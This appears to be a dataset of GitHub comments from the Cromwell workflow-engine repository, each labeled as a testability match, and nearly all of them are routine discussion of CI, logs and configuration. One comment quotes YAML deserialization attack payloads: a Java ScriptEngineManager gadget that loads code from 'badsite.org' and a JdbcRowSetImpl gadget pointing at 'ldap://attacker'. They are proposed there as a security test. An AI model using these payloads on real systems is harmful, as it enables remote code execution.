Testability,> Bunting on review because it looks like we are adding the test in #5408. Not the type of bird usually drawn to my PRs but I'll take it ![indigo bunting](https://pittsburghquarterly.com/media/k2/items/cache/ff0158c2594917cd6a9c4e297e8a8d7c_XL.jpg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584766720:60,test,test,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584766720,1,['test'],['test']
Testability,"> Cloudwatch logs contained the following message: ""/bin/bash: /var/scratch/fetch_and_run.sh: Is a directory"". Also have this error. Anyone figure out what the issue is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-727246269:13,log,logs,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-727246269,1,['log'],['logs']
Testability,"> Codecov isn't a mandatory check, we just don't have a way to tell Github to display the number without a red or green check. Cool, so pending one more approval and then merge? (also finger cross on other tests)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887940650:206,test,tests,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887940650,1,['test'],['tests']
Testability,> Could we replace HSQL with SQLite so that we can aren't maintaining two embedded database implementations?. Created BT-56 to track the issue and steps to getting there. TL;DR we don't CI test the embedded DB with real WDLs so I'd be hesitant to change to SQLite until we can know before users if/when we break it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-733930860:189,test,test,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-733930860,1,['test'],['test']
Testability,"> Do the task logs really only get copied to the storage bucket after the job completes?. Unfortunately, yes. In theory, Google can push these logs directly to the Cloud Storage but we were told that the docs are wrong and that feature does not work (see https://cloud.google.com/php/docs/reference/cloud-batch/latest/V1.LogsPolicy). > logs_path: The path to which logs are saved when the destination = PATH. This can be a local file path on the VM, or under the mount point of a Persistent Disk or Filestore, or a Cloud Storage path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141:14,log,logs,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141,4,"['Log', 'log']","['LogsPolicy', 'logs']"
Testability,"> Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed?. Using ""default credentials"" means that any one of a very long list of configuration setups are auto-detected by the AWS Java SDK. In each SDK-configuration case, the credentials are **not** read from the cromwell-config file and then the values passed on to the AWS SDK. Instead the SDK ""discovers"" them. https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default. This ticket is to instead wire in credentials to the SDK via [Explicitly Specifying Credentials](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-explicit). In the tests:; - Each of the ""[Default Credential Provider](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default)"" options would not be configured on the system; - The `java -Dconfig.file=..."" would contain the AWS key, secret and probably region; - When the various AWS SDK functions run, they each use the passed in credentials to run the commands for S3, Batch, etc.; - The jobs should still run to completion",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165:161,test,tests,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165,4,['test'],['tests']
Testability,"> FYI out of curiosity I'm going to also run the full suite of our centaur tests ([removing the `-i includes`](https://github.com/broadinstitute/cromwell/blob/44/src/ci/bin/testCentaurBcs.sh#L19-L20)) to see if additional tests pass with our credentials. If you can see our test results on the Alibaba servers you may see some failures, but as long as the existing tests pass I'll be satisfied.; > ; > Separately, an entry should be added to the CHANGELOG.md with a short line pointing users to the updated documentation. ([Example](https://github.com/broadinstitute/cromwell/blob/44/CHANGELOG.md#stackdriver-instrumentation)) I've been holding off suggesting this change because that file changes _a lot_ and is subject to frequent merge conflicts. Now that this PR is close enough to merging I think it's time. Done.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512635275:75,test,tests,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512635275,5,['test'],"['test', 'testCentaurBcs', 'tests']"
Testability,"> Fair warning - in keeping with [my comment from February](https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-1421492972), Cromwell does not support or test proxies, so there is no guarantee this PR will be a complete solution and/or that it will keep working. Yes, I think it is understood that this is an option which originates from and is supported from outside the main Cromwell development effort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544787017:170,test,test,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1544787017,1,['test'],['test']
Testability,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. BTW, I really miss the logging you eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627:214,log,logging,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627,2,['log'],['logging']
Testability,"> Haha, I see that the Slurm test failed on Travis! Can we remove it from Travis as part of this PR?. Good idea. Done.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7083#issuecomment-1452547256:29,test,test,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7083#issuecomment-1452547256,1,['test'],['test']
Testability,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:494,log,log,494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424,3,['log'],['log']
Testability,"> Hey @kevin-furant, we had success getting it working. Are you seeing any weird logs? Is your Cromwell instance correctly resolving the docker digest (so it's requesting an image like ""imageName@sha256:ad21[...]"")?. We cannot use Docker on our cluster, I use a Singularity image file; ` SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 300. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float memory_gb = 1; String? docker_mount; String? docker; String? sge_queue = ""bc_b2c_rd.q,b2c_rd_s1.q""; String? sge_project = ""P18Z15000N0143""; """""". runtime-attributes-for-caching {; # singularity_image: true; }. submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; IMAGE=/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124/${docker}.sif; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; singularity exec --containall --bind ${docker_mount}:${docker_mount} --bind ${cwd}:${cwd} --bind ${cwd}:${docker_cwd} $IMAGE /bin/bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; `; ` runtime {; docker: ""qc_align""; docker_mount: ""/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124""; cpu: cpu; memory: ""~{mem}GB"" ; };",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680:81,log,logs,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680,1,['log'],['logs']
Testability,"> Hmm, that's an interesting problem - since centaur runs in server mode I don't think you'd see an exit code.; Does any failure data end up in Cromwell's metadata when this copy fails? If so, centaur can query for the metadata entry. @cjllanwarne I found the problem. I did not have a `final_workflow_outputs_dir` set in the options.json files for the centaur tests. If this path is not set `use_relative_output_paths` is of course not used... :man_facepalming: That is fixed now and it works as expected. Colliding outputs will return as a workflow failure. Since I got the local testing working I was able to add more advanced tests and make sure these are correct as well. The error message is tested when the outputs are colliding. In order for that test to work I had to make the output order of colliding paths in the error message deterministic. (Otherwise it would fail randomly). Also my colleague @DavyCats showed me some centaur tests were file outputs are tested. I used these as an example to also test for the outputs. ; All the behavior that this PR affects is now properly tested, which means that these tests should be able to discover regressions in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482492876:361,test,tests,361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482492876,10,['test'],"['test', 'tested', 'testing', 'tests']"
Testability,> Hopefully all those Codecov claims of uncovered lines are false? 🤞. I think they are true - I didn't write any tests,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700222843:113,test,tests,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700222843,1,['test'],['tests']
Testability,"> How about Centaur tests that submitting pictures of Gumby now produces 4xx errors (and whatever else this fixes)?. I wish! Centaur only handles `200 OK` responses. This fix returns a `400 Bad Request`, quickly, instead of a timeout.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318531402:20,test,tests,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318531402,1,['test'],['tests']
Testability,"> I am having the same error with the example ""Using Data on S3"" on https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-examples/ . I have changed the S3 bucket name in the .json file to my bucket name, but the run still failed. After reporting running failure, I have got the same error message. I am using cromwell-48. The S3 bucket has all public access, and I was logged in as the Admin in two terminal windows, one running the server and the other submitting the job. The previous two hello-world example were successful. There is no log file in the bucket and in the cromwell-execution, the only file create was the script. There is no rc or stderr or stdout created. @blindmouse Were you able to resolve your issue? I am encountering the same problem. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662080275:393,log,logged,393,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662080275,2,['log'],"['log', 'logged']"
Testability,"> I don't have a big problem with this change except that it only half-solves the problem as far as I can see - because one image might have a different root requirement than another image, and restarting Cromwell between running those two tasks is not going to be a viable answer. @cjllanwarne I do agree that different containers might have different requirements. You are completely right. However I do not think this will be a big problem in practice. . - On docker this does not matter. The docker runtime will simply create the required root folder. So there never was a problem here. - For singularity it does. But luckily there is [biocontainers](https://github.com/BioContainers/containers). These all have a `/data` folder. So there this problem is also not applicable. - In case there are people who prefer to invent their own containers instead of using those from biocontainers, they will probably invent their own standard. And if they use some other solution and build on top of that, they will probably adhere to that standard. Furthermore, implementing a solution that enables a per task configuration would:; * Drastically increase the configuration time needed to get a cromwell workflow running with singularity. By orders of magnitude. Since setting a per-task configuration is not going to be fast by any measure.; * Require more complex code to fix.; * Require complex test code to cover all use cases. I think the cost/benefit ratio is rather bad in this case. I do not think there are much use cases for fine-grained control as I outlinded above, and the code requirements are rather high. The fix in the pull request solves the problem that we have (and probably other singularity users have) in the simplest way possible. I think it covers most singularity use cases. And if some people need this per task configuration, those people can also make their own pull request :wink:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420906081:1392,test,test,1392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420906081,2,['test'],['test']
Testability,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:25,test,test,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295,2,['test'],"['test', 'test-reports']"
Testability,"> I think they are true - I didn't write any tests. I was hoping there were already some... 😬 Perhaps not as part of this ticket since this seems to be concerned with making the lookup more efficient, but it seems there really should be some Centaur tests for the overall feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700234400:45,test,tests,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700234400,2,['test'],['tests']
Testability,> I will ask Google if there is something to propagate additional labels to logs. Thank you! This would be a big help in making the GCP Batch backend user-friendly at scale.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287238131:76,log,logs,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287238131,2,['log'],['logs']
Testability,> I'll make a clone of this branch in our repo so that our tests can run on it (it's a permissions thing that means only internal PRs can run the full suite of CI... man_shrugging). Thanks!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-498234074:59,test,tests,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-498234074,1,['test'],['tests']
Testability,"> I'm almost wondering if they should be wrapped in distinct ""root"" and ""possibly not root"" types. Done, plus a squash and rebase. Will merge after tests pass unless the new types aren't what you were imagining.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4195#issuecomment-426398048:148,test,tests,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4195#issuecomment-426398048,1,['test'],['tests']
Testability,"> I'm not a big fan of copy/pasting the entire backend - not least because now all edit history in git from the original files is lost.; > ; > Is it possible to bring in alpha vs beta as a config option to the backend and just switch which API gets called at the relevant points in the code?; > ; > eg; > ; > ```; > backends {; > PAPIv2alpha {; > class="".../papiv2backend""; > config {; > api_version: ""alpha""; > }; > }; > PAPIv2alpha {; > class="".../papiv2backend""; > config {; > api_version: ""beta""; > }; > }; > }; > ```; > ; > Alternatively, could the `class="".../papiv2beta""` backend just be a really thin extension of the existing papiv2alpha backend, which just overrides the api which gets called during submission and status polling?. I'm not a fan of copy-pasting the whole backend too, but in my opinion, in this particular case it's well justified:; 1. In future (I hope sooner than later) when we'll decide to remove v2aplha1, it'll be as easy as deleting a whole single package.; 2. It's less error-prone - we don't modify v2alpha1 implementation at all.; 3. Between the v2alpha1 and v2beta Google made changes not only in the URL and operation id format, but also in the data model (the most significant ones in `Event` and `Action` classes), so I'm afraid that thin extension would end up not so thin.; 4. Also, I don't think git history will be lost. I think git will consider that as files being renamed. At least this is what I'm seeing on `git log --follow -- /Users/gsterin/projects/cromwell/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/LifeSciencesFactory.scala`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580366936:1462,log,log,1462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580366936,1,['log'],['log']
Testability,"> I'm not inclined to add a glob test as I don't think it's really adding any value. The value which I think it would add is guaranteeing that the aliased task directories really are distinct. Eg this particular test case would pass if the tasks were ran in serial (cf. our ""concurrent job start limit"" option for AWS tests)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484259156:33,test,test,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484259156,3,['test'],"['test', 'tests']"
Testability,"> If you are calling Cromwell in run mode, can you wrap it in a script followed by an AWS CLI command to copy the workflow log?. Yes -- I could do that. I was just thinking that workflow log should be automatically copied over since this is a cromwell workflow level log? But if it's too much to implement, the workaround will be just manually copying over it at the end of the workflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4446#issuecomment-450916617:123,log,log,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4446#issuecomment-450916617,3,['log'],['log']
Testability,"> In most cases, the `-branch` build has a significantly shorter runtime than the `-pr` build: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/367/workflows/7b1a2a51-80b7-432a-b883-4c28c15741d4. Is the `-branch` build doing the right thing?. Yes, it mimics current behaviour we have for Travis - for branch builds we actually only run sbt tests and other tests just succeed fast without actually running anything, unless there's a `[force ci]` in the commit message",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901:357,test,tests,357,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901,2,['test'],['tests']
Testability,"> Is it a huge overhead/burden to also turn on the draft-3 versions?. Whenever the originals get updated, these should (in theory) be kept in sync. The point of the CRON tests is to run as close as possible what the real world workflows are running. As many of the originals run in FC, I believe they should be draft-2 for now. If one wanted to additionally clone draft-3/1.0 versions I think that would be fine. ToL: A better version of the CRON tests would just point-to/reference the originals from the source with smaller inputs, instead of having clones in this git repo. EDIT: More specifically re: burden-- this PR is just trying to get the tests green and then move on. I personally don't know enough about ""what's an input, what's an input-with-defaults, what's a non-input-but-calculated-from-an-input"" to go through the hundreds of lines for a ""quick"" convert.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3700#issuecomment-395052458:170,test,tests,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3700#issuecomment-395052458,3,['test'],['tests']
Testability,"> Is it right that like the test didn't like the fact that workflows stayed in the store for too long, even if they all eventually ran? So the submission time sort makes sure that workflows run closer to the order in which they are submitted. @aednichols yes that is correct. So previously, we used to sort by hog group name if there was a tie for lowest workflow running count, and because of this hog groups which started with higher alphabets (c, d, e, f) in Centaur tests were at disadvantage (because hog group names would be first 8 characters of workflow ID) and workflow IDs starting with numbers or lower alphabets would always be picked up causing Centaur to timeout. This should now not happen as we would sort by submission time when there is a tie. >Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne A separate ticket was created for metrics - [BW-1121](https://broadworkbench.atlassian.net/browse/BW-1121).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838:28,test,test,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838,2,['test'],"['test', 'tests']"
Testability,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:550,test,test,550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['test'],['test']
Testability,"> It might be nice to doublecheck in the `newFileSystem` where the `put` happens instead of this one caller since that would make all code paths threadsafe, but I'm not sure if that would introduce any other issues. I agree. But the reason I didn't do this is that `newFileSystem` method has another logic for the case when filesystem with such key already exists - it throws exception instead of just returning the existing filesystem. And this is a contract stated in the core `FileSystemProvider` abstract class.; But I think I can do some refactoring to overcome this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5328#issuecomment-566167823:300,log,logic,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5328#issuecomment-566167823,1,['log'],['logic']
Testability,"> Likely we would want to add a general variable to plug in any user specific arguments (e.g., custom binds) and singularity arguments? (e.g., debug?) I don't know if this is ""how it's supposed to look"". The easiest way to verify a run is to use one (or more) of the [standard test cases](https://github.com/broadinstitute/cromwell/tree/develop/centaur/src/main/resources/standardTestCases). For example you can try to run . ```; java \; -Dconfig.file=my.conf \; -jar cromwell-34.jar \; run centaur/src/main/resources/standardTestCases/hello/hello.wdl \; -i centaur/src/main/resources/standardTestCases/hello/hello.inputs; ```. The accompanying `.test` file lists the CI expectations of the workflow run, ex: `centaur/src/main/resources/standardTestCases/hello.test`. > the stderr files are totally empty, and then the one stdout (without extension) shows those two mapping files … Let me know if this looks correct? What you are looking for? Completely off base?. Based on the WDL you linked to, this output looks like what was expected :+1:. > Also - any reason to have all capitals vs. lowercase for the backend examples? (e.g. SLURM vs slurm). no reasoN. ---. On a related note I personally would love to see cromwell+singularity running under our CI, so that we could all a) point others at the working example and b) be sure the examples continue to work in the future. Most Broadies I know are even greener on Singularity than CircleCI, but I would be keen to learn sometime. Google turned up your earlier work on installing (parts-of?) [Singularity on a Travis VM](https://github.com/singularityhub/singularity-ci). That combined with these commented out configs could be a fantastic starting point to getting singularity+cromwell regularly tested together. For a similar example, with cromwell+TES, here is where that CI script installs and runs `funnel`:. https://github.com/broadinstitute/cromwell/blob/9f33e2a867fe20924e4f24e0cba8774f7d6d3132/src/ci/bin/testCentaurTes.sh#L14-L36. A simila",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519:277,test,test,277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519,6,['test'],['test']
Testability,"> Logs are seen as job progresses with the `CLOUD_LOGGING` option. Thank you @dspeck1, I was able to see cloud task logs for my ""Hello world!"" workflow in realtime when filtering for `batch_task_logs`. In production many Cromwell users scatter thousands of jobs simultaneously per project. Would it be possible to have these cloud logs labeled with workflow id / root workflow id / task / shard / attempt so users can search for logs specific to a Cromwell job? I see there are some GCP Batch job ID-based labels but I don't know how to associate these to jobs in Cromwell / WDL terms.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365:2,Log,Logs,2,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286969365,4,"['Log', 'log']","['Logs', 'logs']"
Testability,"> Looks correct to me. Which environment did you use to run the tests?. I provisioned the dedicated VM of the same shape as used on prod: https://console.cloud.google.com/compute/instancesDetail/zones/us-central1-a/instances/greg-test-oom?project=broad-dsde-cromwell-dev; As a database I used a local MySql installed on the same VM. >>Actually, that work has already been done and merged into develop.; >; >Did you try running this test case rebased onto those changes to confirm that? If not, should we consider making it a future task?. I did not. I'm a bit reluctant to create a new ticket for this, since the whole task is becoming too fine-grained. I can check this within current task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639095508:64,test,tests,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639095508,3,['test'],"['test', 'test-oom', 'tests']"
Testability,"> Looks good, what were the results of running this to the point that Cromwell did not return a successful response?. It either fails with OOM or becomes totally unresponsive for a long time, while writing different kinds of timeout messages to the log (like ""timeout while trying to fetch new workflows"" or something like that).; Regarding number of rows, I remember that it handled 1.500.000 easily (carbonited within minute or two). I didn't look for precise upper bound, but I think that for 15.000.000 it was failing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638307488:249,log,log,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638307488,1,['log'],['log']
Testability,"> Looks great!; > ; > Reviewing this made me think about how we don't seem to have much unit testing of failure modes (my suffix PR suffered from the same issue) - what if I run a WDL with `unzip([(""banana"", 5), (6, ""apple"")])`? Is that valid, or does it fail because we can't find good types for the output arrays?. Agree with this sentiment! I added a few unit tests for basic failure modes. To your more specific question: `unzip([(""banana"", 5), (6, ""apple"")])` will *succeed*, because putting stuff into arrays homogenizes the type, and the integers are coercible to strings. For that to fail, I think we would want arrays to throw errors instead of attempting to homogenize types, which is a big and breaking change that we probably shouldn't make. . However, unzip `([(1, 2), ([1,2,3], 3)])` will fail because there's no way to coerce between `int` and `array[int]`. Added a test case to assert this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921:93,test,testing,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7368#issuecomment-1962000921,4,"['assert', 'test']","['assert', 'test', 'testing', 'tests']"
Testability,"> Looks like this PR didn't catch the test timeout increases for some reason 🤔. Yeah, that's strange. I think this has something to do with the fact that I initially created a draft PR for this branch. Then I closed the draft PR and created a new one, but looks like that didn't help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570604638:38,test,test,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570604638,1,['test'],['test']
Testability,"> Looks very promising! 😄; > ; > I would ask that all commented out code be removed in the final version of the PR (if it's part of work-in-progress that's totally fine).; > ; > I applied these changes to a branch in the Cromwell repo and ran our Centaur CI. There were several test failures, logs are available here: https://travis-ci.com/broadinstitute/cromwell/jobs/202934788. Thanks for your review!; In this PR, BCS started to use the runtime `docker` which only supports AlibabaCloud Container Registry, so in the failed cases, docker image `ubuntu:latest` from dockerhub is not supported. In order to fix it, we need to provide your test account in us-east-1 region a new ECS image which contains a local `ubuntu:latest` docker image, and next week will be ok.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-497553732:278,test,test,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-497553732,3,"['log', 'test']","['logs', 'test']"
Testability,"> Lot's of good stuff here on first glance. I'll dive deeper over the weekend. ok!. > For better or worse, depending on pricing, support, reliability, etc. etc. etc. we like to move around our CI. I personally also like being able to test scripts on my laptop as much as possible. Yes we definitely can! See my comment above - it just is above moving the little snippet where the test actually happens from a command block to running a script from that same command block. > To that end, I'm trying to advocate for bash scripts that are then invoked from whatever CI we choose. +1!. > I haven't RTFM'ed enough of this PR nor CircleCI's manual yet to fully grasp what specific Circle features are being used here. Could a lot of the logic be separated from the .circleci/config.yml into a script, or multiple scripts if necessary?. I think the part we would want to take out are the testing commands, just executed via some primary file (that calls the individual ones, and which could be run on a host). > On a related note, based on your expertise I may want to pick your brain to go over our existing CI scripts too as we move to Circle, or perhaps something even shinier newer. Sure! I'm always around :). > Re your build failing: it wasn't anything in your PR. Based on the logs there was a weird connection issue between Travis and Github returning HTTP 5xx errors during the tests. Yeah, I've unfortunately been there :P Good luck this 